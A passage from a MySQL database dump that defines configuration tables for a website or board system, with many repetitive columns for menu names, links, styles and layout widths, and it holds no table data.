  `cf_main_name_24` text NOT NULL,
  `cf_main_name_25` text NOT NULL,
  `cf_main_name_26` text NOT NULL,
  `cf_main_name_27` text NOT NULL,
  `cf_main_name_28` text NOT NULL,
  `cf_main_name_29` text NOT NULL,
  `cf_main_name_30` text NOT NULL,
  `cf_main_name_31` text NOT NULL,
  `cf_main_name_32` text NOT NULL,
  `cf_main_name_33` text NOT NULL,
  `cf_main_name_34` text NOT NULL,
  `cf_main_name_35` text NOT NULL,
  `cf_main_name_36` text NOT NULL,
  `cf_main_name_37` text NOT NULL,
  `cf_main_name_38` text NOT NULL,
  `cf_main_name_39` text NOT NULL,
  `cf_main_style_0` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_1` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_2` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_3` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_4` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_5` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_6` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_7` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_8` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_9` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_10` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_11` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_12` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_13` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_14` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_15` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_16` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_17` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_18` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_19` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_20` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_21` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_22` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_23` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_24` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_25` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_26` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_27` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_28` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_29` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_30` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_31` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_32` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_33` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_34` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_35` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_36` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_37` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_38` varchar(30) NOT NULL DEFAULT '',
  `cf_main_style_39` varchar(30) NOT NULL DEFAULT '',
  `cf_main_long_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_5` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_6` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_7` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_8` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_9` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_10` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_11` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_12` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_13` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_14` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_15` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_16` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_17` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_18` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_19` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_20` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_21` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_22` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_23` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_24` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_25` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_26` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_27` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_28` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_29` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_30` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_31` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_32` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_33` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_34` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_35` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_36` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_37` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_38` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_long_39` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_5` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_6` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_7` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_8` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_9` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_10` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_11` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_12` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_13` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_14` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_15` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_16` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_17` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_18` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_nouse_19` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_name_0` text NOT NULL,
  `cf_main_left_name_1` text NOT NULL,
  `cf_main_left_name_2` text NOT NULL,
  `cf_main_left_name_3` text NOT NULL,
  `cf_main_left_name_4` text NOT NULL,
  `cf_main_left_name_5` text NOT NULL,
  `cf_main_left_name_6` text NOT NULL,
  `cf_main_left_name_7` text NOT NULL,
  `cf_main_left_name_8` text NOT NULL,
  `cf_main_left_name_9` text NOT NULL,
  `cf_main_left_name_10` text NOT NULL,
  `cf_main_left_name_11` text NOT NULL,
  `cf_main_left_name_12` text NOT NULL,
  `cf_main_left_name_13` text NOT NULL,
  `cf_main_left_name_14` text NOT NULL,
  `cf_main_left_name_15` text NOT NULL,
  `cf_main_left_name_16` text NOT NULL,
  `cf_main_left_name_17` text NOT NULL,
  `cf_main_left_name_18` text NOT NULL,
  `cf_main_left_name_19` text NOT NULL,
  `cf_main_left_style_0` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_1` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_2` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_3` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_4` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_5` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_6` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_7` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_8` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_9` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_10` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_11` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_12` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_13` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_14` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_15` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_16` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_17` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_18` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_style_19` varchar(30) NOT NULL DEFAULT '',
  `cf_main_left_admin_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_5` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_6` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_7` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_8` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_9` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_10` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_11` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_12` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_13` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_14` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_15` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_16` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_17` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_18` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_left_admin_19` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_5` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_6` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_7` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_8` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_9` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_10` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_11` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_12` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_13` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_14` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_15` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_16` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_17` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_18` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_nouse_19` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_name_0` text NOT NULL,
  `cf_main_right_name_1` text NOT NULL,
  `cf_main_right_name_2` text NOT NULL,
  `cf_main_right_name_3` text NOT NULL,
  `cf_main_right_name_4` text NOT NULL,
  `cf_main_right_name_5` text NOT NULL,
  `cf_main_right_name_6` text NOT NULL,
  `cf_main_right_name_7` text NOT NULL,
  `cf_main_right_name_8` text NOT NULL,
  `cf_main_right_name_9` text NOT NULL,
  `cf_main_right_name_10` text NOT NULL,
  `cf_main_right_name_11` text NOT NULL,
  `cf_main_right_name_12` text NOT NULL,
  `cf_main_right_name_13` text NOT NULL,
  `cf_main_right_name_14` text NOT NULL,
  `cf_main_right_name_15` text NOT NULL,
  `cf_main_right_name_16` text NOT NULL,
  `cf_main_right_name_17` text NOT NULL,
  `cf_main_right_name_18` text NOT NULL,
  `cf_main_right_name_19` text NOT NULL,
  `cf_main_right_style_0` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_1` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_2` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_3` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_4` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_5` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_6` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_7` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_8` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_9` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_10` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_11` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_12` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_13` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_14` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_15` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_16` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_17` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_18` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_style_19` varchar(30) NOT NULL DEFAULT '',
  `cf_main_right_admin_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_5` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_6` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_7` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_8` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_9` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_10` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_11` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_12` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_13` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_14` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_15` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_16` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_17` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_18` enum('','checked') NOT NULL DEFAULT '',
  `cf_main_right_admin_19` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_nouse_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_nouse_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_nouse_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_nouse_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_nouse_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_name_0` text NOT NULL,
  `cf_head_name_1` text NOT NULL,
  `cf_head_name_2` text NOT NULL,
  `cf_head_name_3` text NOT NULL,
  `cf_head_name_4` text NOT NULL,
  `cf_head_style_0` varchar(30) NOT NULL DEFAULT '',
  `cf_head_style_1` varchar(30) NOT NULL DEFAULT '',
  `cf_head_style_2` varchar(30) NOT NULL DEFAULT '',
  `cf_head_style_3` varchar(30) NOT NULL DEFAULT '',
  `cf_head_style_4` varchar(30) NOT NULL DEFAULT '',
  `cf_head_long_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_long_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_long_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_long_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_head_long_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_nouse_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_nouse_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_nouse_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_nouse_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_nouse_4` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_name_0` text NOT NULL,
  `cf_tail_name_1` text NOT NULL,
  `cf_tail_name_2` text NOT NULL,
  `cf_tail_name_3` text NOT NULL,
  `cf_tail_name_4` text NOT NULL,
  `cf_tail_style_0` varchar(30) NOT NULL DEFAULT '',
  `cf_tail_style_1` varchar(30) NOT NULL DEFAULT '',
  `cf_tail_style_2` varchar(30) NOT NULL DEFAULT '',
  `cf_tail_style_3` varchar(30) NOT NULL DEFAULT '',
  `cf_tail_style_4` varchar(30) NOT NULL DEFAULT '',
  `cf_tail_long_0` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_long_1` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_long_2` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_long_3` enum('','checked') NOT NULL DEFAULT '',
  `cf_tail_long_4` enum('','checked') NOT NULL DEFAULT '',
  PRIMARY KEY (`id`),
  UNIQUE KEY `cf_id` (`cf_id`)
) ENGINE=MyISAM AUTO_INCREMENT=10 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_config2`
--

LOCK TABLES `g5_config2` WRITE;
/*!40000 ALTER TABLE `g5_config2` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_config2` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_config2m`
--

DROP TABLE IF EXISTS `g5_config2m`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_config2m` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `cf_id` varchar(30) NOT NULL DEFAULT '',
  `cf_templete` varchar(30) NOT NULL DEFAULT 'basic',
  `cf_search` varchar(30) NOT NULL DEFAULT 'nouse',
  `cf_menu` varchar(30) NOT NULL DEFAULT 'list',
  `cf_main_image` varchar(30) NOT NULL DEFAULT 'nouse',
  PRIMARY KEY (`id`),
  UNIQUE KEY `cf_id` (`cf_id`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `g5_config2m`
--

LOCK TABLES `g5_config2m` WRITE;
/*!40000 ALTER TABLE `g5_config2m` DISABLE KEYS */;
/*!40000 ALTER TABLE `g5_config2m` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `g5_config2w`
--

DROP TABLE IF EXISTS `g5_config2w`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `g5_config2w` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `cf_id` varchar(30) NOT NULL DEFAULT '',
  `cf_header_logo` text NOT NULL,
  `cf_site_addr` text NOT NULL,
  `cf_copyright` text NOT NULL,
  `cf_keywords` text NOT NULL,
  `cf_description` text NOT NULL,
  `cf_templete` varchar(30) NOT NULL DEFAULT '',
  `cf_max_menu` tinyint(4) NOT NULL DEFAULT '10',
  `cf_max_submenu` tinyint(4) NOT NULL DEFAULT '10',
  `cf_width_main_total` int(11) NOT NULL DEFAULT '960',
  `cf_width_main` int(11) NOT NULL DEFAULT '520',
  `cf_width_main_left` int(11) NOT NULL DEFAULT '220',
  `cf_width_main_right` int(11) NOT NULL DEFAULT '220',
  `cf_hide_left` tinyint(4) NOT NULL DEFAULT '0',
  `cf_hide_right` tinyint(4) NOT NULL DEFAULT '0',
  `cf_max_main` tinyint(4) NOT NULL DEFAULT '30',
  `cf_max_main_left` tinyint(4) NOT NULL DEFAULT '15',
  `cf_max_main_right` tinyint(4) NOT NULL DEFAULT '15',
  `cf_max_head` tinyint(4) NOT NULL DEFAULT '5',
  `cf_max_tail` tinyint(4) NOT NULL DEFAULT '5',
  `cf_menu_name_0` text NOT NULL,
  `cf_menu_name_1` text NOT NULL,
  `cf_menu_name_2` text NOT NULL,
  `cf_menu_name_3` text NOT NULL,
  `cf_menu_name_4` text NOT NULL,
  `cf_menu_name_5` text NOT NULL,
  `cf_menu_name_6` text NOT NULL,
  `cf_menu_name_7` text NOT NULL,
  `cf_menu_name_8` text NOT NULL,
  `cf_menu_name_9` text NOT NULL,
  `cf_menu_leng_0` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_1` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_2` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_3` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_4` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_5` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_6` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_7` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_8` int(11) NOT NULL DEFAULT '0',
  `cf_menu_leng_9` int(11) NOT NULL DEFAULT '0',
  `cf_menu_link_0` text NOT NULL,
  `cf_menu_link_1` text NOT NULL,
  `cf_menu_link_2` text NOT NULL,
  `cf_menu_link_3` text NOT NULL,
  `cf_menu_link_4` text NOT NULL,
  `cf_menu_link_5` text NOT NULL,
  `cf_menu_link_6` text NOT NULL,
  `cf_menu_link_7` text NOT NULL,
  `cf_menu_link_8` text NOT NULL,
  `cf_menu_link_9` text NOT NULL,
  `cf_submenu_name_0_0` text NOT NULL,
  `cf_submenu_name_0_1` text NOT NULL,
  `cf_submenu_name_0_2` text NOT NULL,
  `cf_submenu_name_0_3` text NOT NULL,
  `cf_submenu_name_0_4` text NOT NULL,
  `cf_submenu_name_0_5` text NOT NULL,
  `cf_submenu_name_0_6` text NOT NULL,
  `cf_submenu_name_0_7` text NOT NULL,
  `cf_submenu_name_0_8` text NOT NULL,
  `cf_submenu_name_0_9` text NOT NULL,
  `cf_submenu_link_0_0` text NOT NULL,
  `cf_submenu_link_0_1` text NOT NULL,
  `cf_submenu_link_0_2` text NOT NULL,
  `cf_submenu_link_0_3` text NOT NULL,
  `cf_submenu_link_0_4` text NOT NULL,
  `cf_submenu_link_0_5` text NOT NULL,
  `cf_submenu_link_0_6` text NOT NULL,
  `cf_submenu_link_0_7` text NOT NULL,
  `cf_submenu_link_0_8` text NOT NULL,
  `cf_submenu_link_0_9` text NOT NULL,
  `cf_submenu_name_1_0` text NOT NULL,
  `cf_submenu_name_1_1` text NOT NULL,
  `cf_submenu_name_1_2` text NOT NULL,
  `cf_submenu_name_1_3` text NOT NULL,
  `cf_submenu_name_1_4` text NOT NULL,
  `cf_submenu_name_1_5` text NOT NULL,
  `cf_submenu_name_1_6` text NOT NULL,
  `cf_submenu_name_1_7` text NOT NULL,
  `cf_submenu_name_1_8` text NOT NULL,
  `cf_submenu_name_1_9` text NOT NULL,
  `cf_submenu_link_1_0` text NOT NULL,
  `cf_submenu_link_1_1` text NOT NULL,
  `cf_submenu_link_1_2` text NOT NULL,
  `cf_submenu_link_1_3` text NOT NULL,
  `cf_submenu_link_1_4` text NOT NULL,
  `cf_submenu_link_1_5` text NOT NULL,
  `cf_submenu_link_1_6` text NOT NULL,
  `cf_submenu_link_1_7` text NOT NULL,
  `cf_submenu_link_1_8` text NOT NULL,
  `cf_submenu_link_1_9` text NOT NULL,
  `cf_submenu_name_2_0` text NOT NULL,
  `cf_submenu_name_2_1` text NOT NULL,
  `cf_submenu_name_2_2` text NOT NULL,
  `cf_submenu_name_2_3` text NOT NULL,
  `cf_submenu_name_2_4` text NOT NULL,
  `cf_submenu_name_2_5` text NOT NULL,
  `cf_submenu_name_2_6` text NOT NULL,
  `cf_submenu_name_2_7` text NOT NULL,
  `cf_submenu_name_2_8` text NOT NULL,
  `cf_submenu_name_2_9` text NOT NULL,
  `cf_submenu_link_2_0` text NOT NULL,
  `cf_submenu_link_2_1` text NOT NULL,
  `cf_submenu_link_2_2` text NOT NULL,
  `cf_submenu_link_2_3` text NOT NULL,
  `cf_submenu_link_2_4` text NOT NULL,
  `cf_submenu_link_2_5` text NOT NULL,
  `cf_submenu_link_2_6` text NOT NULL,
  `cf_submenu_link_2_7` text NOT NULL,
  `cf_submenu_link_2_8` text NOT NULL,
  `cf_submenu_link_2_9` text NOT NULL,
  `cf_submenu_name_3_0` text NOT NULL,
  `cf_submenu_name_3_1` text NOT NULL,
  `cf_submenu_name_3_2` text NOT NULL,
  `cf_submenu_name_3_3` text NOT NULL,
  `cf_submenu_name_3_4` text NOT NULL,
  `cf_submenu_name_3_5` text NOT NULL,
  `cf_submenu_name_3_6` text NOT NULL,
  `cf_submenu_name_3_7` text NOT NULL,
  `cf_submenu_name_3_8` text NOT NULL,
  `cf_submenu_name_3_9` text NOT NULL,
  `cf_submenu_link_3_0` text NOT NULL,
  `cf_submenu_link_3_1` text NOT NULL,
  `cf_submenu_link_3_2` text NOT NULL,
  `cf_submenu_link_3_3` text NOT NULL,
  `cf_submenu_link_3_4` text NOT NULL,
  `cf_submenu_link_3_5` text NOT NULL,
  `cf_submenu_link_3_6` text NOT NULL,
  `cf_submenu_link_3_7` text NOT NULL,
  `cf_submenu_link_3_8` text NOT NULL,
  `cf_submenu_link_3_9` text NOT NULL,
  `cf_submenu_name_4_0` text NOT NULL,
  `cf_submenu_name_4_1` text NOT NULL,
  `cf_submenu_name_4_2` text NOT NULL,
  `cf_submenu_name_4_3` text NOT NULL,
  `cf_submenu_name_4_4` text NOT NULL,
  `cf_submenu_name_4_5` text NOT NULL,
  `cf_submenu_name_4_6` text NOT NULL,
  `cf_submenu_name_4_7` text NOT NULL,
  `cf_submenu_name_4_8` text NOT NULL,
  `cf_submenu_name_4_9` text NOT NULL,
  `cf_submenu_link_4_0` text NOT NULL,
  `cf_submenu_link_4_1` text NOT NULL,
  `cf_submenu_link_4_2` text NOT NULL,
  `cf_submenu_link_4_3` text NOT NULL,
  `cf_submenu_link_4_4` text NOT NULL,
  `cf_submenu_link_4_5` text NOT NULL,
  `cf_submenu_link_4_6` text NOT NULL,
  `cf_submenu_link_4_7` text NOT NULL,
  `cf_submenu_link_4_8` text NOT NULL,
  `cf_submenu_link_4_9` text NOT NULL,
  `cf_submenu_name_5_0` text NOT NULL,
  `cf_submenu_name_5_1` text NOT NULL,
  `cf_submenu_name_5_2` text NOT NULL,
  `cf_submenu_name_5_3` text NOT NULL,
  `cf_submenu_name_5_4` text NOT NULL,
  `cf_submenu_name_5_5` text NOT NULL,
  `cf_submenu_name_5_6` text NOT NULL,
  `cf_submenu_name_5_7` text NOT NULL,
  `cf_submenu_name_5_8` text NOT NULL,
  `cf_submenu_name_5_9` text NOT NULL,
  `cf_submenu_link_5_0` text NOT NULL,
  `cf_submenu_link_5_1` text NOT NULL,
  `cf_submenu_link_5_2` text NOT NULL,
  `cf_submenu_link_5_3` text NOT NULL,
  `cf_submenu_link_5_4` text NOT NULL,
  `cf_submenu_link_5_5` text NOT NULL,
  `cf_submenu_link_5_6` text NOT NULL,
  `cf_submenu_link_5_7` text NOT NULL,
  `cf_submenu_link_5_8` text NOT NULL,
  `cf_submenu_link_5_9` text NOT NULL,
  `cf_submenu_name_6_0` text NOT NULL,
  `cf_submenu_name_6_1` text NOT NULL,
  `cf_submenu_name_6_2` text NOT NULL,
  `cf_submenu_name_6_3` text NOT NULL,
  `cf_submenu_name_6_4` text NOT NULL,
  `cf_submenu_name_6_5` text NOT NULL,
  `cf_submenu_name_6_6` text NOT NULL,
  `cf_submenu_name_6_7` text NOT NULL,
  `cf_submenu_name_6_8` text NOT NULL,
  `cf_submenu_name_6_9` text NOT NULL,
  `cf_submenu_link_6_0` text NOT NULL,
  `cf_submenu_link_6_1` text NOT NULL,
  `cf_submenu_link_6_2` text NOT NULL,
  `cf_submenu_link_6_3` text NOT NULL,
  `cf_submenu_link_6_4` text NOT NULL,
  `cf_submenu_link_6_5` text NOT NULL,
  `cf_submenu_link_6_6` text NOT NULL,
  `cf_submenu_link_6_7` text NOT NULL,
  `cf_submenu_link_6_8` text NOT NULL,
  `cf_submenu_link_6_9` text NOT NULL,
  `cf_submenu_name_7_0` text NOT NULL,
  `cf_submenu_name_7_1` text NOT NULL,
  `cf_submenu_name_7_2` text NOT NULL,
  `cf_submenu_name_7_3` text NOT NULL,
  `cf_submenu_name_7_4` text NOT NULL,
